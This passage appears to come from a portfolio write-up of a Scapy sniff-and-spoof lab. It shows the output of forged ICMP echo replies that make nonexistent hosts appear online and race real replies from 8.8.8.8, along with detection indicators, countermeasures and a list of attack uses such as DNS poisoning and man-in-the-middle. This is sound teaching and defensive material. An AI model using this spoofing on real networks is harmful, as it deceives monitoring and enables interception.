64 bytes from 10.0.2.99: icmp_seq=4 ttl=64 time=0.149 ms

--- 10.0.2.99 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3062ms
rtt min/avg/max/mdev = 0.138/0.146/0.156/0.007 ms
```

**Analysis:**

| Expected Behavior | Actual Behavior | Attack Impact |
|------------------|-----------------|---------------|
| ARP request fails | Spoofed reply bypasses ARP | ARP not required |
| "Destination Host Unreachable" | Successful ping | Host appears online |
| 100% packet loss | 0% packet loss | Network scan evasion |

**Security Implications:**
- Network scanners (nmap) would detect "fake" hosts
- Honeypot creation without actual services
- Could mislead security audits
- Demonstrates layer 3 vs layer 2 attack surface

---

### **Test Scenario 3: Existing Host on Internet (8.8.8.8)**

**Terminal 2 - Ping Real Server:**
```bash
ping -c 4 8.8.8.8
```

**Attack Tool Output:**
```
[INTERCEPTED] ICMP Request
  Source: 10.0.2.15
  Destination: 8.8.8.8
  ICMP ID: 9999, Seq: 1
[SPOOFED] Sent fake reply from 8.8.8.8 to 10.0.2.15
  ICMP Type: 0 (Echo Reply)
  Payload: b'abcdefghijklmnopqrstuvwabcdefghi'

[INTERCEPTED] ICMP Request
  Source: 10.0.2.15
  Destination: 8.8.8.8
  ICMP ID: 9999, Seq: 2
[SPOOFED] Sent fake reply from 8.8.8.8 to 10.0.2.15
  ...
```

**Ping Command Output:**
```
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=64 time=0.167 ms
64 bytes from 8.8.8.8: icmp_seq=1 ttl=117 time=28.4 ms (DUP!)
64 bytes from 8.8.8.8: icmp_seq=2 ttl=64 time=0.154 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=117 time=29.1 ms (DUP!)
64 bytes from 8.8.8.8: icmp_seq=3 ttl=64 time=0.161 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=117 time=28.8 ms (DUP!)

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, +4 duplicates, 0% packet loss
```

**Critical Analysis - TWO Replies Per Request:**

| Reply Source | TTL | Time | Origin |
|-------------|-----|------|--------|
| **First Reply** | 64 | ~0.16ms | 🔴 SPOOFED (local attacker) |
| **Second Reply (DUP)** | 117 | ~28ms | ✅ REAL (Google's 8.8.8.8) |

**Why Two Replies?**

```
Time 0ms:   Victim sends ICMP Echo Request
Time 0.16ms: Attacker sends spoofed reply (TTL=64, local)
Time 28ms:  Real server's reply arrives (TTL=117, Internet)
            └─> Marked as "DUP" (duplicate) by ping
```

**Race Condition Analysis:**

| Winner | Time | Detection |
|--------|------|-----------|
| Attacker | ~0.2ms | **Wins race** - accepted as primary |
| Real Server | ~28ms | **Loses race** - flagged as duplicate |

---

#### **Route Verification**

**Command:**
```bash
ip route get 8.8.8.8
```

**Output:**
```
8.8.8.8 via 10.0.2.1 dev enp0s3 src 10.0.2.15 uid 1000
    cache
```

**Route Breakdown:**

| Component | Value | Meaning |
|-----------|-------|---------|
| Destination | 8.8.8.8 | Target IP |
| via | 10.0.2.1 | Next hop (gateway) |
| dev | enp0s3 | Outbound interface |
| src | 10.0.2.15 | Source IP for packets |

**Path Taken:**
```
10.0.2.15 (victim) → 10.0.2.1 (gateway) → Internet → 8.8.8.8 (Google)
              ↑
         [Attacker intercepts here and spoofs reply]
```

---

### **Attack Impact Summary**

**Scenario Comparison:**

| Target | Exists? | Attack Success | Victim's Perception | Detection Difficulty |
|--------|---------|----------------|-------------------|---------------------|
| 1.2.3.4 | ❌ No | 100% | Host is online | 🔴 Hard (no baseline) |
| 10.0.2.99 | ❌ No | 100% | Host is online | 🟡 Medium (LAN scan) |
| 8.8.8.8 | ✅ Yes | Partial | Gets spoofed + real | 🟢 Easy (duplicate replies) |

**Detection Indicators:**

| Indicator | Normal | Under Attack | Red Flag |
|-----------|--------|--------------|----------|
| **RTT to Internet** | 20-100ms | <1ms | ⚠️ Impossibly fast |
| **TTL from Internet** | 40-120 | 64 (default) | ⚠️ Unchanged TTL |
| **Duplicate Replies** | None | Present | ⚠️ Multiple sources |
| **Non-existent hosts respond** | Timeout | Success | ⚠️ Impossible |

---

### **Real-World Attack Applications**

**1. DNS Cache Poisoning Preparation:**
- Sniff DNS queries (UDP port 53)
- Spoof DNS responses with malicious IPs
- Redirect victims to phishing sites

**2. ARP Spoofing Enhancement:**
- Combine with ARP poisoning
- Full man-in-the-middle capability
- Intercept and modify any traffic

**3. IDS/IPS Evasion:**
- Make blocked IPs appear responsive
- Bypass blacklist-based filtering
- Confuse security monitoring tools

**4. Denial of Service:**
- Flood victim with spoofed replies
- Amplification attack foundation
- Network congestion

---

### **Defensive Countermeasures**

**Network-Level Defenses:**

| Defense | Implementation | Effectiveness |
|---------|---------------|--------------|
| **Egress Filtering** | Block outbound packets with spoofed source IPs | 🟢 Prevents spoofing |
| **Ingress Filtering** | Verify source IP matches expected interface | 🟢 Blocks external spoofing |
| **ICMP Rate Limiting** | Limit ICMP replies per second | 🟡 Slows attack |
| **Packet TTL Analysis** | Monitor for abnormal TTL values | 🟡 Detects spoofing |

**Host-Level Defenses:**

| Defense | Implementation | Effectiveness |
|---------|---------------|--------------|
| **Strict ICMP ID/Seq Matching** | Verify reply matches exact request | 🟢 Rejects invalid replies |
| **RTT Anomaly Detection** | Alert on impossibly low latencies | 🟢 Detects local spoofing |
| **Duplicate Reply Detection** | Investigate when duplicates occur | 🟢 Identifies attack |

**Monitoring & Detection:**

```python
# Pseudo-code for detection
if (reply_time < 1ms and destination_is_internet):
    alert("Possible ICMP spoofing detected - RTT impossibly low")

if (duplicate_replies > 0):
    alert("Multiple ICMP replies - potential MITM attack")

if (ttl == 64 and expected_ttl < 64):
    alert("TTL anomaly - possible local spoofing")
```

---

### **Skills Demonstrated:**

**Attack Development:**
- ✅ Real-time packet interception
- ✅ Automated response generation
- ✅ Race condition exploitation
- ✅ Man-in-the-middle attack foundations
- ✅ Protocol manipulation (ICMP)

**Network Security:**
- ✅ Understanding of packet routing
- ✅ TTL analysis and manipulation
- ✅ Detection evasion techniques
- ✅ Network forensics (duplicate detection)
- ✅ Layer 3 attack vectors

**Programming:**
- ✅ Callback function implementation
- ✅ Packet crafting automation
- ✅ Real-time data processing
- ✅ Error handling
- ✅ BPF filter optimization

**Security Analysis:**
- ✅ Attack impact assessment
- ✅ Detection mechanism identification
- ✅ Defensive countermeasure knowledge
- ✅ Forensic indicator recognition

---

## 🎓 Key Learning Outcomes

### **Network Attack Techniques Mastered:**

| Technique | Proficiency | Real-World Application |
|-----------|-------------|----------------------|
| **Packet Sniffing** | ✅ Advanced | Network monitoring, IDS |
| **Packet Spoofing** | ✅ Advanced | Penetration testing, security research |
| **ICMP Manipulation** | ✅ Expert | Network diagnostics, attack simulation |
| **TCP/UDP Analysis** | ✅ Intermediate | Protocol debugging, traffic analysis |
| **Custom Tool Development** | ✅ Advanced | Security automation, research |
| **MITM Attack Basics** | ✅ Intermediate | Offensive security, red teaming |

### **Scapy Framework Mastery:**

**Functions Used:**

| Function | Purpose | Complexity |
|----------|---------|------------|
| `sniff()` | Capture packets | ⭐⭐ Intermediate |
| `send()` | Inject packets | ⭐⭐ Intermediate |
| `sr1()` | Send & receive one | ⭐⭐⭐ Advanced |
| `IP()` / `ICMP()` / `TCP()` / `UDP()` | Layer construction | ⭐⭐⭐ Advanced |
| `Raw()` | Payload handling | ⭐ Basic |
| BPF Filters | Traffic filtering | ⭐⭐⭐ Advanced |

---

## 💡 Real-World Relevance & Industry Impact

### **Historical Network Attacks:**

| Attack | Year | Technique | Impact |
|--------|------|-----------|--------|
| **Mirai Botnet** | 2016 | ICMP/TCP flooding | 1 Tbps DDoS |
| **DNS Amplification** | 2013 | Spoofed DNS queries | Spamhaus 300 Gbps attack |
| **BGP Hijacking** | 2018 | Route spoofing | MyEtherWallet DNS redirect |
| **ARP Spoofing (Ettercap)** | 2001-Present | MITM attacks | WiFi eavesdropping |

### **Professional Applications:**

**1. Penetration Testing:**
- Network vulnerability assessment
- MITM attack simulation
- Security control validation
- Client security awareness training

**2. Network Security Engineering:**
- IDS/IPS rule development
- Traffic anomaly detection
- Packet inspection systems
- Security tool development

**3. Incident Response:**
- Network forensics analysis
- Attack reconstruction
- Lateral movement detection
- Threat hunting

**4. Security Research:**
- Protocol vulnerability discovery
- Exploit development
- Defense mechanism testing
- Academic research

---

## 🔧 Technical Skills Portfolio

### **Programming & Scripting:**
- ✅ Python 3 (network programming)
- ✅ Scapy framework (packet manipulation)
- ✅ Socket programming (raw sockets)
- ✅ Bash scripting (automation)
- ✅ Regular expressions (packet filtering)

### **Network Protocols:**
- ✅ ICMP (Echo Request/Reply, Time Exceeded)
- ✅ TCP (Three-way handshake, flags, sequence numbers)
- ✅ UDP (Connectionless communication)
- ✅ IP (Addressing, routing, TTL)
- ✅ ARP (Address Resolution Protocol concepts)
- ✅ DNS (Query/response structure)

### **Security Tools:**
- ✅ Wireshark (packet analysis)
- ✅ Scapy (packet crafting)
- ✅ tcpdump (command-line capture)
- ✅ ifconfig/ip (network configuration)
- ✅ ping/traceroute (diagnostics)
- ✅ curl/nslookup (traffic generation)

### **Linux Administration:**
- ✅ User/group management (wireshark group)
- ✅ File permissions (chmod)
- ✅ Package management (apt-get)
- ✅ Network interface configuration
- ✅ Root privilege operations (sudo)

---